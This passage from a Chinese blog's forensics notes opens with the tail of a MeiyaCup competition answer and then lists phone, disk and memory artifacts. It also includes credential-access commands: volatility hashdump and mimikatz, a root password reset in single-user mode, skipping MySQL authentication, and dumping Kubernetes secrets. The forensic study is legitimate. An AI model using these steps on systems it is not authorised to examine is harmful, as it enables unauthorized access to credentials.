<p>B</p>
<p>在最近访问的项目里有6个，最近打开保存文件里有2个，虽然有两个同名了但是路径不一样，非要解释也只能这么说了。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231118143800983.png" alt="image-20231118143800983"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231118143838709.png" alt="image-20231118143838709"></p>
</li>
<li><p>参考’Windows 7’ 文件夹回答以下题目，在Windows 7中，potplayer最后播放的文件名？</p>
<p>unlock-me-149058.mp3</p>
<p>直接用火眼跑最近访问的项目得到的答案是错的，还是要仿真看。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231118142758781.png" alt="image-20231118142758781"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>Forensic</category>
      </categories>
      <tags>
        <tag>MeiyaCup</tag>
      </tags>
  </entry>
  <entry>
    <title>关于取证的备忘录</title>
    <url>/2023/11/17/Forensic/%E5%8F%96%E8%AF%81%E5%A4%87%E5%BF%98%E5%BD%95/</url>
    <content><![CDATA[<h2 id="Phone"><a href="#Phone" class="headerlink" title="Phone"></a>Phone</h2><h3 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h3><blockquote>
<p><a href="https://blog.csdn.net/lijunjun1120/article/details/108720372">android 各镜像文件img总结</a></p>
</blockquote>
<ul>
<li><code>/data/data/[包名]</code>：存储配置文件、聊天数据等。</li>
<li><code>/storage/emulated/0/Android/[包名]</code>：包含了缓存、配置文件等。</li>
<li><code>/storage/emulated/0/[应用名]</code>：这个大多数情况下都有。</li>
<li><code>/storage/emulated/0/[包名]</code>：这个少有，多半是空文件夹。</li>
</ul>
<h3 id="Iphone"><a href="#Iphone" class="headerlink" title="Iphone"></a>Iphone</h3><blockquote>
<p><a href="https://www.cnblogs.com/ios8/p/ios-store1.html">IOS 设备备份文件详解</a></p>
</blockquote>
<p><strong>Manifest.plist</strong>可以看到屏保密码的形式：</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231102200902380.png" alt="image-20231102200902380"></p>
<p>passware导入<strong>Manifest.plist</strong>可以恢复苹果的备份密码。</p>
<span id="more"></span>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231108111418056.png" alt="image-20231108111418056"></p>
<p>相册相关数据库<strong>Photos.sqlite</strong>，位置位于<code>/CameraRollDomain/Media/PhotoData/Photos.sqlite</code>，在<strong>ZADDITIONALASSETATTRIBUTES</strong>表中可以找到需要的信息。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231101160916764.png" alt="image-20231101160916764"></p>
<p>隔空投送（com.apple.sharingd）的照片和之前的照片名字上的数字不连贯， 并且时间不连续。元数据是否被修改可以看创建日期是否和修改日期相同。如果聊天分享不发原图的话，EXIF元数据文件就没了。实况照片会创建一个小的MOV。</p>
<p>GSM媒体访问控制地址就是Mac地址，看无线地址就可以。</p>
<h2 id="Computer"><a href="#Computer" class="headerlink" title="Computer"></a>Computer</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>MBR又叫做主引导扇区，是计算机开机后访问磁盘时读取的首个扇区，即位于硬盘的0号柱面(Cylinder)、0号磁头(Side)、1号扇区(Sector)。该扇区占 512 字节（bytes）。它由三个部分组成：主引导程序 446 bytes（boot loader，即主引导记录，现在linux一般由grub2作为boot loader）；硬盘分区表 64 bytes （Disk Partition Table，存放磁盘分区数据的表）；结束标志位 2 bytes （固定为十六进制的55AA）。</p>
<p>MBR与GPT的区别在于硬盘分区表，这是由于MBR分区方式的缺陷导致的：硬盘分区表是用来记录硬盘里面有多少个分区以及每一分区的大小，一共占 64 字节，即 16*4 ，所以最多只有4 个分区信息可以写到第一个扇区中，所以就称这4个分区为4个主分区 ( primary partion )，每个分区占16 bytes。在有限的空间内，需要记录分区表的详细情况：</p>
<p><img src="https://pic2.zhimg.com/80/v2-02971255a86505e1d51ff69b10efc311_720w.webp" alt="img"></p>
<table>
<thead>
<tr>
<th align="left">16进制值</th>
<th align="left">最大容量</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">00h</td>
<td align="left"></td>
<td align="left">未用</td>
</tr>
<tr>
<td align="left">01h</td>
<td align="left">2 Mb</td>
<td align="left">FAT12</td>
</tr>
<tr>
<td align="left">02h</td>
<td align="left"></td>
<td align="left">XENIX Root</td>
</tr>
<tr>
<td align="left">03h</td>
<td align="left"></td>
<td align="left">XENIX User</td>
</tr>
<tr>
<td align="left">04h</td>
<td align="left">32 Mb</td>
<td align="left">FAT16 （CHS 寻址模式，分区最大为 32 Mb）</td>
</tr>
<tr>
<td align="left">05h</td>
<td align="left">2 Gb</td>
<td align="left">扩展分区（CHS 寻址模式）</td>
</tr>
<tr>
<td align="left">06h</td>
<td align="left">2 Gb</td>
<td align="left">FAT16 （CHS 寻址模式，分区大小大于 32 Mb)</td>
</tr>
<tr>
<td align="left">07h</td>
<td align="left">16 Eb</td>
<td align="left">NTFS</td>
</tr>
<tr>
<td align="left">08h</td>
<td align="left"></td>
<td align="left">AIX</td>
</tr>
<tr>
<td align="left">09h</td>
<td align="left"></td>
<td align="left">AIX Bootable</td>
</tr>
<tr>
<td align="left">0Ah</td>
<td align="left"></td>
<td align="left">Bootmanager</td>
</tr>
<tr>
<td align="left">0Bh</td>
<td align="left">2 Gb</td>
<td align="left">FAT32 （CHS 寻址模式）</td>
</tr>
<tr>
<td align="left">0Ch</td>
<td align="left">2 Tb</td>
<td align="left">FAT32 （LBA 寻址模式）</td>
</tr>
<tr>
<td align="left">0Eh</td>
<td align="left">2 Gb</td>
<td align="left">FAT16 （LBA address mode）</td>
</tr>
<tr>
<td align="left">0Fh</td>
<td align="left">2 Tb</td>
<td align="left">扩展分区 （LBA 寻址模式）</td>
</tr>
<tr>
<td align="left">10h</td>
<td align="left"></td>
<td align="left">OPUS</td>
</tr>
<tr>
<td align="left">12h</td>
<td align="left"></td>
<td align="left">CPQ Diagnostics</td>
</tr>
<tr>
<td align="left">14h</td>
<td align="left">2^89 bytes</td>
<td align="left">Omega FS （用于 Maverick OS）</td>
</tr>
<tr>
<td align="left">15h</td>
<td align="left"></td>
<td align="left">Swap 分区</td>
</tr>
</tbody></table>
<p>可以将MBR磁盘转换为GPT磁盘，并且只有在磁盘为空的情况下，才可以将GPT磁盘转换为MBR磁盘。</p>
<p>一个GPT磁盘可以分为两大部分：保护MBR部分和EFI部分。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231107094310061.png" alt="image-20231107094310061"></p>
<p>FAT32 文件系统结构：</p>
<table>
<thead>
<tr>
<th align="center">BOOT</th>
</tr>
</thead>
<tbody><tr>
<td align="center">BOOT备份</td>
</tr>
<tr>
<td align="center">FAT1</td>
</tr>
<tr>
<td align="center">FAT2</td>
</tr>
<tr>
<td align="center">根目录，FAT12&#x2F;FAT16</td>
</tr>
<tr>
<td align="center">数据区</td>
</tr>
</tbody></table>
<p>Boot Sector (FAT32)：</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231107100859271.png" alt="image-20231107100859271"></p>
<p>NTFS 文件系统结构：</p>
<table>
<thead>
<tr>
<th align="center">BOOT</th>
</tr>
</thead>
<tbody><tr>
<td align="center">MFTMirr</td>
</tr>
<tr>
<td align="center">BITMAP</td>
</tr>
<tr>
<td align="center">子目录</td>
</tr>
<tr>
<td align="center">数据区（当分区大小大于32G时，大小固定为3G）</td>
</tr>
<tr>
<td align="center">MFT</td>
</tr>
<tr>
<td align="center">数据区</td>
</tr>
<tr>
<td align="center">LOGFIRE（位置一般在DBR往后十几个G处）</td>
</tr>
<tr>
<td align="center">数据区</td>
</tr>
<tr>
<td align="center">BOOT备份</td>
</tr>
</tbody></table>
<p>NTFS使用逻辑簇号（LCN，Logical Cluster Number）和虚拟簇号（VCN，Virtual Cluster Number）来对簇进行定位。LCN是对卷中所有簇从头到尾进行简单编号，VCN则是对属于特定文件的簇从头到尾进行编号，以便引用文件中的数据。NTFS卷通过Bitmap文件记录所有簇的使用情况。</p>
<p><strong>NTFS结构基于MFT。卷上的任何事物都是文件，文件通过主文件表MFT来确定其在卷上的位置，MFT是一个与文件相对应的数据库，由一系列文件FILE记录组成——卷中每一个文件（夹）都有一个文件记录，对于大型文件，还可以有多个记录与之对应。主文件表自身也有它自己的文件记录$MFT。MFT占用的存储空间可以是连续的，也可以是分块的。</strong></p>
<p>对于 Mft2Csv 的结果做一个中文的翻译：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RecordOffset：记录偏移</span><br><span class="line">Signature：签名</span><br><span class="line">IntegrityCheck：完整性检查</span><br><span class="line">Style：样式</span><br><span class="line">HEADER_MFTRecordNumber：MFT记录号</span><br><span class="line">HEADER_SequenceNo：序列号</span><br><span class="line">Header_HardLinkCount：硬链接计数</span><br><span class="line">FN_ParentReferenceNo：父引用号</span><br><span class="line">FN_ParentSequenceNo：父序列号</span><br><span class="line">FN_FileName：文件名</span><br><span class="line">FilePath：文件路径</span><br><span class="line">HEADER_Flags：标志</span><br><span class="line">RecordActive：记录激活</span><br><span class="line">FileSizeBytes：文件大小（字节）</span><br><span class="line">SI_FilePermission：文件权限</span><br><span class="line">FN_Flags：文件名标志</span><br><span class="line">FN_NameType：文件名类型</span><br><span class="line">ADS：备用数据流</span><br><span class="line">SI_CTime：创建时间</span><br><span class="line">SI_ATime：访问时间</span><br><span class="line">SI_MTime：修改时间</span><br><span class="line">SI_RTime：记录时间</span><br><span class="line">MSecTest：毫秒测试</span><br><span class="line">FN_CTime：文件名创建时间</span><br><span class="line">FN_ATime：文件名访问时间</span><br><span class="line">FN_MTime：文件名修改时间</span><br><span class="line">FN_RTime：文件名记录时间</span><br><span class="line">CTimeTest：创建时间测试</span><br><span class="line">FN_AllocSize：文件名分配大小</span><br><span class="line">FN_RealSize：文件名实际大小</span><br><span class="line">FN_EaSize：文件名扩展属性大小</span><br><span class="line">SI_USN：USN（更新序列号）</span><br><span class="line">DATA_Name：数据名</span><br><span class="line">DATA_Flags：数据标志</span><br><span class="line">DATA_LengthOfAttribute：属性长度</span><br><span class="line">DATA_IndexedFlag：索引标志</span><br><span class="line">DATA_VCNs：VCN（虚拟簇号）</span><br><span class="line">DATA_NonResidentFlag：非驻留标志</span><br><span class="line">DATA_CompressionUnitSize：压缩单元大小</span><br><span class="line">HEADER_LSN：LSN（日志序列号）</span><br><span class="line">HEADER_RecordRealSize：记录实际大小</span><br><span class="line">HEADER_RecordAllocSize：记录分配大小</span><br><span class="line">HEADER_BaseRecord：基础记录</span><br><span class="line">HEADER_BaseRecSeqNo：基础记录序列号</span><br><span class="line">HEADER_NextAttribID：下一个属性ID</span><br><span class="line">DATA_AllocatedSize：数据分配大小</span><br><span class="line">DATA_RealSize：数据实际大小</span><br><span class="line">DATA_InitializedStreamSize：初始化流大小</span><br><span class="line">SI_HEADER_Flags：头部标志</span><br><span class="line">SI_MaxVersions：最大版本数</span><br><span class="line">SI_VersionNumber：版本号</span><br><span class="line">SI_ClassID：类别ID</span><br><span class="line">SI_OwnerID：所有者ID</span><br><span class="line">SI_SecurityID：安全性ID</span><br><span class="line">SI_Quota：配额</span><br><span class="line">FN_CTime_2：文件名创建时间（第二部分）</span><br><span class="line">FN_ATime_2：文件名访问时间（第二部分）</span><br><span class="line">FN_MTime_2：文件名修改时间（第二部分）</span><br><span class="line">FN_RTime_2：文件名记录时间（第二部分）</span><br><span class="line">FN_AllocSize_2：文件名分配大小（第二部分）</span><br><span class="line">FN_RealSize_2：文件名实际大小（第二部分）</span><br><span class="line">FN_EaSize_2：文件名扩展属性大小（第二部分）</span><br><span class="line">FN_Flags_2：文件名标志（第二部分）</span><br><span class="line">FN_NameLength_2：文件名长度（第二部分）</span><br><span class="line">FN_NameType_2：文件名类型（第二部分）</span><br><span class="line">FN_FileName_2：文件名（第二部分）</span><br><span class="line">GUID_ObjectID：对象ID的GUID</span><br><span class="line">GUID_BirthVolumeID：出生卷的GUID</span><br><span class="line">GUID_BirthObjectID：出生对象的GUID</span><br><span class="line">GUID_DomainID：域的GUID</span><br><span class="line">VOLUME_NAME_NAME：卷名称</span><br><span class="line">VOL_INFO_NTFS_VERSION：NTFS版本</span><br><span class="line">VOL_INFO_FLAGS：卷信息标志</span><br><span class="line">FN_CTime_3：文件名创建时间（第三部分）</span><br><span class="line">FN_ATime_3：文件名访问时间（第三部分）</span><br><span class="line">FN_MTime_3：文件名修改时间（第三部分）</span><br><span class="line">FN_RTime_3：文件名记录时间（第三部分）</span><br><span class="line">FN_AllocSize_3：文件名分配大小（第三部分）</span><br><span class="line">FN_RealSize_3：文件名实际大小（第三部分）</span><br><span class="line">FN_EaSize_3：文件名扩展属性大小（第三部分）</span><br><span class="line">FN_Flags_3：文件名标志（第三部分）</span><br><span class="line">FN_NameLength_3：文件名长度（第三部分）</span><br><span class="line">FN_NameType_3：文件名类型（第三部分）</span><br><span class="line">FN_FileName_3：文件名（第三部分）</span><br><span class="line">DATA_Name_2：数据名（第二部分）</span><br><span class="line">DATA_NonResidentFlag_2：非驻留标志（第二部分）</span><br><span class="line">DATA_Flags_2：数据标志（第二部分）</span><br><span class="line">DATA_LengthOfAttribute_2：属性长度（第二部分）</span><br><span class="line">DATA_IndexedFlag_2：索引标志（第二部分）</span><br><span class="line">DATA_StartVCN_2：起始VCN（第二部分）</span><br><span class="line">DATA_LastVCN_2：最后VCN（第二部分）</span><br><span class="line">DATA_VCNs_2：VCN（虚拟簇号，第二部分）</span><br><span class="line">DATA_CompressionUnitSize_2：压缩单元大小（第二部分）</span><br><span class="line">DATA_AllocatedSize_2：数据分配大小（第二部分）</span><br><span class="line">DATA_RealSize_2：数据实际大小（第二部分）</span><br><span class="line">DATA_InitializedStreamSize_2：初始化流大小（第二部分）</span><br><span class="line">DATA_Name_3：数据名（第三部分）</span><br><span class="line">DATA_NonResidentFlag_3：非驻留标志（第三部分）</span><br><span class="line">DATA_Flags_3：数据标志（第三部分）</span><br><span class="line">DATA_LengthOfAttribute_3：属性长度（第三部分）</span><br><span class="line">DATA_IndexedFlag_3：索引标志（第三部分）</span><br><span class="line">DATA_StartVCN_3：起始VCN（第三部分）</span><br><span class="line">DATA_LastVCN_3：最后VCN（第三部分）</span><br><span class="line">DATA_VCNs_3：VCN（虚拟簇号，第三部分）</span><br><span class="line">DATA_CompressionUnitSize_3：压缩单元大小（第三部分）</span><br><span class="line">DATA_AllocatedSize_3：数据分配大小（第三部分）</span><br><span class="line">DATA_RealSize_3：数据实际大小（第三部分）</span><br><span class="line">DATA_InitializedStreamSize_3：初始化流大小（第三部分）</span><br><span class="line">STANDARD_INFORMATION_ON：标准信息是否存在</span><br><span class="line">ATTRIBUTE_LIST_ON：属性列表是否存在</span><br><span class="line">FILE_NAME_ON：文件名是否存在</span><br><span class="line">OBJECT_ID_ON：对象ID是否存在</span><br><span class="line">SECURITY_DESCRIPTOR_ON：安全描述符是否存在</span><br><span class="line">VOLUME_NAME_ON：卷名称是否存在</span><br><span class="line">VOLUME_INFORMATION_ON：卷信息是否存在</span><br><span class="line">DATA_ON：数据是否存在</span><br><span class="line">INDEX_ROOT_ON：索引根是否存在</span><br><span class="line">INDEX_ALLOCATION_ON：索引分配是否存在</span><br><span class="line">BITMAP_ON：位图是否存在</span><br><span class="line">REPARSE_POINT_ON：重新解释点是否存在</span><br><span class="line">EA_INFORMATION_ON：扩展属性信息是否存在</span><br><span class="line">EA_ON：扩展属性是否存在</span><br><span class="line">PROPERTY_SET_ON：属性集是否存在</span><br><span class="line">LOGGED_UTILITY_STREAM_ON：记录的实用流是否存在</span><br><span class="line">DT_DataRun：数据运行</span><br></pre></td></tr></table></figure>

<p>MFT中比较重要的 0x80 属性表：</p>
<ul>
<li><p>常驻</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231118145911972.png" alt="image-20231118145911972"></p>
</li>
<li><p>非常驻</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231118145919276.png" alt="image-20231118145919276"></p>
</li>
</ul>
<blockquote>
<p><a href="https://zhuanlan.zhihu.com/p/430917018">MBR与GPT：磁盘分区方式</a></p>
<p><a href="https://juejin.cn/post/6844903664235069454#heading-0">磁盘分区原理：从MBR到GPT</a></p>
<p><a href="https://blog.csdn.net/csdn66_2016/article/details/88066637">FAT32文件系统格式详解</a></p>
<p><a href="https://blog.csdn.net/tianjin_ren/article/details/127241467">NTFS文件系统详解</a></p>
<p><a href="https://blog.csdn.net/dzqxwzoe/article/details/132819639">Windows 取证之$MFT</a></p>
</blockquote>
<p><strong>hiberfil.sys</strong>是一个系统文件会实时备份内存数据，在早期版本的Windows中， Hiberfil.sys 文件的大小等同于物理内存大小；而在Windows 7中，Hiberfil.sys可以在物理内存大小的50% - 100%的范围自行调整。</p>
<p>在Windows系统中一个文件被删除，并不是真的被删除，这是发生了两个操作：一个是把被删除的文件重命名为<code>$R****.ext</code>文件放入到该盘的回收站下，一个是生成一个<code>$I****.ext</code>文件记录文件信息，这两个文件一般是对应的，并且<code>****</code>部分的名字完全相同。</p>
<p>时间线信息存放在<strong>ActivitiesCache.db</strong>数据库中。</p>
<p>卷影复制服务VSS，Windows日志中可以找到。</p>
<p>用户标识符就是SUID短划线最后一段。</p>
<p>控制面板可以看到软件安装的时间。</p>
<p>当打开一个文件的时候，会在&#x2F;Users&#x2F;[username]&#x2F;AppData&#x2F;Roaming&#x2F;Microsoft&#x2F;Windows&#x2F;Recent下创建一个链接。</p>
<p>TeamViewer 倾向于通过端口<strong>5938</strong>进行对外的 TCP 和 UDP 连接（这是TeamViewer 的主要端口），并且TeamViewer 在使用此端口时具有最佳性能。如果TeamViewer 无法通过端口5938进行连接，接下来会尝试通过TCP端口<strong>443</strong>进行连接。如果TeamViewer 无法通过端口5938或443进行连接，则会尝试通过TCP端口<strong>80</strong>进行连接。由于会产生额外消耗，并且如果连接断开也不会自动重新连接，所以通过此端口的连接速度比通过端口5938或443慢，可靠性也较低。因此，端口80仅作为最后备用选择。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 注册表</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page			// 浏览器主页</span><br><span class="line">SOFTWARE/Microsoft/Windows NT/CurrentVersion		// 计算机系统安装时间</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">tasklist /m		<span class="comment"># 查看调用的dll</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><a href="https://www.cnblogs.com/wtsgtc/p/14956884.html">查看SecureCRT会话中保存的密文</a></p>
</blockquote>
<h3 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h3><p>苹果电脑的硬件配置可以在<strong>hardwareConfig.json</strong>中看到。</p>
<ul>
<li><p>macOS 自动登录配置文件：&#x2F;Library&#x2F;Preferences&#x2F;com.apple.loginwindow.plist </p>
</li>
<li><p>macOS 自动登录密码设置文件：&#x2F;etc&#x2F;kcpassword</p>
</li>
<li><p>macoS 版本号存储文件：&#x2F;System&#x2F;Library&#x2F;CoreServices&#x2F;SystemVersion.plist</p>
</li>
</ul>
<p><code>.DocumentRevisions-V100</code> 是 macOS 中用于支持版本控制功能的目录。这个目录包含了与文档版本控制相关的数据。版本控制允许用户在保存文档时保留历史版本，并在需要时还原到先前的版本。</p>
<h3 id="Memory"><a href="#Memory" class="headerlink" title="Memory"></a>Memory</h3><p>关于内存取证，由于安装比较复杂，记录一下防止忘记，最好是在Linux上使用。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget http://downloads.volatilityfoundation.org/releases/2.6/volatility-2.6.zip</span><br><span class="line">unzip volatility-2.6.zip</span><br><span class="line"></span><br><span class="line">cd volatility-2.6/</span><br><span class="line">python2 setup.py build</span><br><span class="line">python2 setup.py install</span><br><span class="line"></span><br><span class="line">python2 -m pip install pycryptodome</span><br><span class="line">python2 -m pip install distorm3</span><br><span class="line"></span><br><span class="line">// 添加单个模块</span><br><span class="line">cp mimikatz.py /usr/local/lib/python2.7/dist-packages/volatility/plugins</span><br><span class="line">python2 -m pip install construct==2.5.5-reupload</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a href="https://blog.csdn.net/q851579181q/article/details/110956485">volatility2各类外部插件使用简介</a></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// volatility2</span><br><span class="line"></span><br><span class="line">python2 ./vol.py -f memdump.mem imageinfo</span><br><span class="line">python2 ./vol.py -f ./memdump.mem --profile=Win7SP1x64 hashdump</span><br><span class="line">python2 ./vol.py -f ./memdump.mem --profile=Win7SP1x64 mimikatz</span><br><span class="line">python2 ./vol.py -f ./memdump.mem --profile=Win7SP1x64 pslist</span><br><span class="line">python2 ./vol.py -f ./memdump.mem --profile=Win7SP1x64 pstree</span><br><span class="line">python2 ./vol.py -f ./memdump.mem --profile=Win7SP1x64 dlllist</span><br><span class="line">python2 ./vol.py -f ./memdump.mem --profile=Win7SP1x64 getsids</span><br><span class="line">python2 ./vol.py -f ./memdump.mem --profile=Win7SP1x64 netscan</span><br><span class="line">python2 ./vol.py -f ./memdump.mem --profile=Win7SP1x64 hivelist			// 打印注册表配置单元列表</span><br><span class="line">python2 ./vol.py -f ./memdump.mem --profile=Win7SP1x64 timeliner		// 时间线</span><br><span class="line">python2 ./vol.py --plugins=./community/JamesHall_KevinBreen -f ./memdump.mem --profile=Win7SP1x64 usbstor</span><br><span class="line">python2 ./vol.py -f ./memdump.mem --profile=Win7SP1x64 shellbags &gt; shellbags.txt		// 文件夹</span><br></pre></td></tr></table></figure>

<h2 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h2><blockquote>
<p><a href="https://blog.csdn.net/ApatheCrazyFan/article/details/89454436">LINUX - LVM原理及PV、VG、LV、PE、LE关系图</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/166374034?utm_id=0#">Linux磁盘操作：分区、格式化、挂载</a></p>
<p><a href="https://blog.csdn.net/qq_44895681/article/details/105657604">利用mdadm工具构建RAID 0&#x2F;1&#x2F;5&#x2F;6&#x2F;10磁盘阵列实战</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/51170719">各种RAID磁盘阵列视图</a></p>
</blockquote>
<blockquote>
<p><a href="https://blog.csdn.net/tjcwt2011/article/details/125484870">Linux shell加密解密方法（gzexe、shc）</a></p>
<p><a href="https://www.runoob.com/linux/linux-comm-crontab.html">Linux crontab 命令（计划任务）</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1183385">Linux 终端tty pty pts描述</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1683126">Linux用户登录日志查询：utmp、wtmp、btmp文件</a></p>
</blockquote>
<blockquote>
<p><a href="https://blog.csdn.net/houhj168/article/details/80436073">Linux中vsftpd配置文件vsftpd.conf详解</a></p>
<p><a href="https://www.cnblogs.com/hanease/p/15890509.html">nginx详细参数配置</a></p>
<p><a href="https://cloud.tencent.com/developer/article/2106399">Apache配置详解</a></p>
<p><a href="https://www.cnblogs.com/WXjzc/p/17738053.html">解决服务器取证过程中宝塔强制绑定手机号的问题</a></p>
<p><a href="https://cloud.tencent.com/developer/news/399413">七种方式解决WordPress忘记后台密码</a></p>
</blockquote>
<p>关于Linux进入单用户修改密码的步骤：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ro	-&gt;	rw init=/sysroot/bin/sh</span><br><span class="line">Ctrl + x</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">mount -o remount,rw /sysroot</span></span><br><span class="line">chroot /sysroot/</span><br><span class="line">passwd</span><br><span class="line">touch / .autorelabel</span><br><span class="line"></span><br><span class="line">cat /etc/selinux/config</span><br><span class="line">getenforce</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">enforcing 执行中</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">permissive 不执行但产生警告</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">disabled 关闭</span></span><br></pre></td></tr></table></figure>

<p>查看硬盘、分区等信息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">df [-h | -T]</span><br><span class="line">parted -l		# 列出磁盘的分区信息</span><br><span class="line">blkid		# 查看设备 UUID</span><br><span class="line">lsblk -f		# 列出所有设备信息</span><br><span class="line">fdisk -l</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zpool status	# 查看储存池RAID</span><br><span class="line">zpool history	# 查看储存池历史</span><br><span class="line">zfs list -t snapshot		# 查看快照</span><br><span class="line">zfs rollback media0/mediastorage@version1		# 恢复快照</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a href="https://www.cnblogs.com/zhangguosheng1121/p/13389051.html">zfs详解</a></p>
<p><a href="https://bbs.huaweicloud.com/blogs/379558">使用 zpool 命令示例在 Linux 上设置 ZFS 文件系统</a></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">uname -a</span><br><span class="line">dpkg --get -selections | grep linux-image</span><br><span class="line">find / -type f -exec grep -l &quot;&lt;text&gt;&quot; &#123;&#125; +</span><br></pre></td></tr></table></figure>

<p>var&#x2F;log&#x2F;auth.log 记录sudo、ssh等用户认证日志，只有root用户才可写入。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql	my.cnf</span><br><span class="line">redis	redis.conf</span><br></pre></td></tr></table></figure>

<p>必要时可以向my.cnf里面写入<strong>skip-grant-tables</strong>来跳过登录的验证，但是进入不能修改密码。</p>
<blockquote>
<p><a href="https://blog.csdn.net/weixin_43423484/article/details/124408565">Windows安装mysql详细步骤</a></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &#x27;%datadir%&#x27;;			# 数据库文件的位置</span><br><span class="line"></span><br><span class="line"># mysql 5.7</span><br><span class="line">select host, user, authentication_string from mysql.user;</span><br><span class="line">create user &#x27;test&#x27;@&#x27;%&#x27; identified by &#x27;123456&#x27;;</span><br><span class="line">alter user &#x27;root&#x27;@&#x27;localhost&#x27; identified by &#x27;123456&#x27;;</span><br><span class="line">update mysql.user set host = &#x27;%&#x27; where user = &#x27;root&#x27;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>

<p><strong>注意网站重构后要附上正确的权限，包括网站目录和数据库目录</strong>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chown -R mysql:mysql /www/server/data</span><br><span class="line"></span><br><span class="line">chown -R redis:redis /var/log/redis</span><br><span class="line">chmod -R u+rwX,g+rwX,u+rx /var/log/redis</span><br><span class="line"></span><br><span class="line">chgrp -R nginx admin.paofen.com/</span><br></pre></td></tr></table></figure>

<p>恢复数据库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysqldump -u&lt;user&gt; -p&lt;passwd&gt; --database &lt;database&gt; &gt; &lt;backup.sql&gt;</span><br><span class="line">mysql -u&lt;user&gt; -p&lt;passwd&gt; &lt;database&gt; &lt; &lt;backup.sql&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a href="https://blog.csdn.net/weixin_40230682/article/details/118703478">阿里云Mysql5.7 数据库恢复 qp.xb文件恢复数据</a></p>
<p><a href="https://blog.csdn.net/xddtrue/article/details/105699975">恢复XB后缀数据库</a></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl cluster-info</span><br><span class="line">kubectl get nodes -o wide</span><br><span class="line">kubectl get pods --all-namespaces -o wide</span><br><span class="line">kubectl get configmap kubeadm-config -n kube-system -o yaml</span><br><span class="line">kubectl get namespaces</span><br><span class="line">kubectl get secrets</span><br><span class="line">kubectl get pv</span><br><span class="line">kubectl get pvc --all-namespaces</span><br><span class="line">kubectl describe svc &lt;svc&gt; -n &lt;ns&gt;</span><br><span class="line">kubectl describe pod &lt;pod&gt; -n &lt;ns&gt;</span><br><span class="line">kubectl describe secret &lt;secret&gt;</span><br><span class="line">kubectl get secret &lt;secret-name&gt; -n &lt;namespace&gt; -o jsonpath=&#x27;&#123;.data.\.dockerconfigjson&#125;&#x27;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a href="https://blog.csdn.net/yprufeng/article/details/105652059">人手一套k8s常用命令集合-CSDN博客</a></p>
</blockquote>
<h2 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h2><p>常见的文件头：</p>
<table>
<thead>
<tr>
<th>文件格式</th>
<th>文件头</th>
</tr>
</thead>
<tbody><tr>
<td>JPEG (jpg)</td>
<td>FFD8FFE1</td>
</tr>
<tr>
<td>PNG (png)</td>
<td>89504E47</td>
</tr>
<tr>
<td>ZIP (zip)</td>
<td>504B0304</td>
</tr>
<tr>
<td>RAR (rar)</td>
<td>52617221</td>
</tr>
<tr>
<td>xls or doc</td>
<td>D0CF11E0</td>
</tr>
</tbody></table>
<p>时间戳和时间转换：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">dt = <span class="string">&quot;2023-09-25 07:51:18&quot;</span></span><br><span class="line">timeArray = time.strptime(dt, <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line">timestamp = time.mktime(timeArray)</span><br></pre></td></tr></table></figure>

